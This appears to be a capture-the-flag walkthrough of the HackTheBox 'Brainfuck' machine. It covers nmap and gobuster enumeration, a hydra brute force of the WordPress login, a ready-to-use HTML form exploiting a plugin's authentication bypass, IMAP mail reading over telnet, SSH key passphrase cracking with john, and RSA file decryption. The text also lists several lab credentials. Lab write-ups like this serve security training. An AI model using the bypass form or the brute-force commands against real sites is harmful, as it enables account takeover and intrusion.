###############
Brainfuck
INSANE Level
Wordpress wp_set_auth_cookie() exploit + HTML Form + Local Server
admin encrypted discussion
Decrypt via https://gchq.github.io/CyberChef/ and Vigenere 
OR 
https://rumkin.com/tools/cipher/one-time-pad/ an compare value
SSH private key id_rsa decrypt - john wordilst + ssh2jhon.py
Decrypt Part: https://benheater.com/hackthebox-brainfuck/
###############john

1-Enummeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.228.97 -v
        PORT    STATE SERVICE  VERSION
        22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)

        25/tcp  open  smtp?
        |_smtp-commands: Couldn't establish connection on port 25

        110/tcp open  pop3     Dovecot pop3d
        |_pop3-capabilities: RESP-CODES SASL(PLAIN) PIPELINING UIDL TOP AUTH-RESP-CODE USER CAPA

        143/tcp open  imap     Dovecot imapd
        |_imap-capabilities: OK more LITERAL+ capabilities have LOGIN-REFERRALS IDLE AUTH=PLAINA0001 post-login SASL-IR listed Pre-login ID IMAP4rev1 ENABLE

        443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
        |_http-title: Welcome to nginx!
        |_ssl-date: TLS randomness does not represent time
        | tls-alpn: 
        |_  http/1.1
        | http-methods: 
        |_  Supported Methods: GET HEAD
        |_http-server-header: nginx/1.10.0 (Ubuntu)
        | tls-nextprotoneg: 
        |_  http/1.1
        | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
        | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
        | Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
        | Public Key type: rsa
        | Public Key bits: 3072
        | Signature Algorithm: sha256WithRSAEncryption
            | Not valid before: 2017-04-13T11:19:29
            | Not valid after:  2027-04-11T11:19:29
            | MD5:   cbf1:6899:96aa:f7a0:0565:0fc0:9491:7f20
            |_SHA-1: f448:e798:a817:5580:879c:8fb8:ef0e:2d3d:c656:cb66
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



    # Port 443:
        We check the Certificate
            Email Address   orestis@brainfuck.htb
            DNS:www.brainfuck.htb
            DNS:sup3rs3cr3t.brainfuck.htb

        We add this domains to our /etc/hosts

        https://sup3rs3cr3t.brainfuck.htb/

        https://sup3rs3cr3t.brainfuck.htb/d/1-development:
            POST https://sup3rs3cr3t.brainfuck.htb/login
                    {
                    "errors": [
                        {
                        "status": "401",
                        "code": "permission_denied"
                        }
                    ]
                    }
            /.htaccess   

        https://brainfuck.htb/
            nginx 1.10.0
            WordPress 4.7.3
            └─$ gobuster dir -u https://brainfuck.htb/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k     
                /wp-content           (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-content/]
                /wp-includes          (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-includes/]
                /wp-admin             (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-admin/]




        https://brainfuck.htb/wp-login.php
            Brute Forcing the login page

            └─$ hydra -l admin -P /home/kali/Desktop/Transfer_to_Victim_Machine/1000Million_Passwd/rockyou.txt brainfuck.htb https-post-form "/wp-login.php/login:username=^USER^&password=^PASS^&loginform=Login&lang=en_US:The password you entered for the username admin is incorrect." -V -f -o hydra-output.txt -t 4 -s 443 -I 

            [443][http-post-form] host: brainfuck.htb   login: admin   password: laila123

            Wrong passwd

        
        EXPLOIT OF https://brainfuck.htb/:
            we found "admin" account-name
            #wp_set_auth_cookie() exploit to connect without passwords
            #vuln: https://www.exploit-db.com/
            The exploit code and it was a simple HTML login form

                <form method="post" action="http://target.com/wp-admin/admin-ajax.php">
                    Username: <input type="text" name="username" value="admin">
                    <input type="hidden" name="email" value="EMAIL">
                    <input type="hidden" name="action" value="loginGuestFacebook">
                    <input type="submit" value="Login">
                </form>

            #We modify the form with the right URL and Email:
                <form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
                    Username: <input type="text" name="username" value="admin">
                    <input type="hidden" name="email" value="orestis@brainfuck.htb">
                    <input type="hidden" name="action" value="loginGuestFacebook">
                    <input type="submit" value="Login">
                </form>

            #We save the File in .html
            #We run via pyton3 -m http.server the HTML page in OUR Local Host

            If success we goes back to: https://brainfuck.htb/

            we are admin with the admin cookie!!

    2-Exploit https://brainfuck.htb/ - WP - Admin Panel:
        #We don't have the right to edit "Themes" and add a PHP reverse Shell

        #But We can edit the SMTP Server Settings:
        We Found the username and Password:
            orestis
            kHGuERB29DNiNE

        # MAIL SERVER EXPPLOIT PORT 143:
        Mail Server
        Using the credentials obtained from wordpress, it is trivial to extract the emails from the server.
        Any IMAP-capable mail client or even Telnet can be used here. 
        The example below will use
        Telnet.
        1. telnet brainfuck.htb 143
        2. a1 LOGIN orestis kHGuERB29DNiNE
        3. a2 LIST "" "*"
        4. a3 EXAMINE INBOX
        5. a4 FETCH 1 BODY[]
        6. a5 FETCH 2 BODY[]

        In the User mail box we discovered new password:
            kIEnnfEKJ#9UmdO

        # We found in the supersrect.brainfuck.htb a disucssion between admin and orestis
        # The discussion was encoded:
            Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg :)
            mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja

            # We decode via https://gchq.github.io/CyberChef/ and Vigenere or https://rumkin.com/tools/cipher/one-time-pad/ and compare values an digits
            There you go you stupid fuck, I hope you remember your key password because I dont :)
            https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa

        # We crack the id_rsa passphrase:
            1-─$ python /usr/share/john/ssh2john.py  id_rsa > id_rsa.hash

            2-└─$ john --wordlist=/home/kali/Desktop/Transfer_to_Victim_Machine/1000Million_Passwd/rockyou.txt id_rsa.hash
                3poulakia!
            
        # We display the password again
            john --show id_rsa.hash
                3poulakia!

    
2-Prive Esc via SSH creds Founds:
    orestis@brainfuck:~$ whoami
        orestis
    orestis@brainfuck:~$ uname -a
        Linux brainfuck 4.4.0-75-generic #96-Ubuntu SMP Thu Apr 20 09:56:33 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

    # We found some encrypted files again and a script
    # We googled the script and find a similar with using RSA encryption
    # We assume that it is the same encryption
    # We found a script thet decode with 3 variables a,b,q and and the cypher ct
    # We use the script with the encryptes files and the re decome into Hex to plaintext

    # Password:
        6efc1a5dbb8904751ce6566a305bb8ef